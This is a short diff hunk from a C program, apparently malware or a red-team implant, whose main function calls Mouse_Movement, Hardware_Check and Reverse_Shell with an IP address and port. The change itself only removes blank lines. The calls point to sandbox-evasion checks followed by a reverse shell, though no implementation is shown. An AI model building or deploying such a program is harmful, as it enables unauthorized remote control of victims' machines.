@@ -21,8 +21,4 @@ int main(int argc , char **argv)
    Mouse_Movement();
    Hardware_Check();
    Reverse_Shell(IP_Address , Port);
-
-   
-
-
 }
